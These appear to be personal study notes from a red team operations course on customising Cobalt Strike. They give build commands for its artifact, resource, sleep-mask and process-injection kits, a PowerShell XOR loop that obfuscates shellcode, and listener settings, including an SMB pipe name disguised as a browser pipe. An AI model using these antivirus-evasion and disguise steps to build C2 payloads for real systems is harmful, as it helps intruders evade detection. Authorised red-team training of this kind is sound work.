## Change kits (Saved on Windows and ext disc)
https://github.com/RedefiningReality/Cobalt-Strike/tree/main/kits

Artifact kit
```
https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/37495050-artifact-kit
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
```
Resources:
Change template.x64.ps1
Change ALL variables in the file

```
for ($zz = 0; $zz -lt $v_code.Count; $zz++) {
	$v_code[$zz] = $v_code[$zz] -bxor 35
}

for ($i = 0; $i -lt $v_service.Count; $i++) {
	$var_service[$i] = $v_service[$i] -bxor 35
}
```
```
./build.sh /mnt/c/Tools/cobaltstrike/resources
```
Sleepmask
```
./build.sh 47 WaitForSingleObject true none /mnt/c/Tools/cobaltstrike/sleep-mask
```
Process Injection
```
./build.sh /mnt/c/Tools/cobaltstrike/process_inj
```
inlineExceute-assembly
```
Download 
-> https://github.com/anthemtotheego/InlineExecute-Assembly/blob/main/inlineExecuteAssembly/inlineExecute-Assemblyx64.o
-> https://github.com/RedefiningReality/Cobalt-Strike/blob/main/post-ex/inline-x.cna

Compile
-> https://github.com/RedefiningReality/Cobalt-Strike/blob/main/post-ex/powerpick.cs

Change Route of powerpick

If powerpick doesnt work use powerpick-patched of artifact.cna
```
![[Pasted image 20240918124051.png]]
## Listeners
```
ls \\.\pipe\
mojo.5888.5048.1881222447974724358 (change last 4 chars)

http 80

tcp 4444
```
## Generate all Payloads

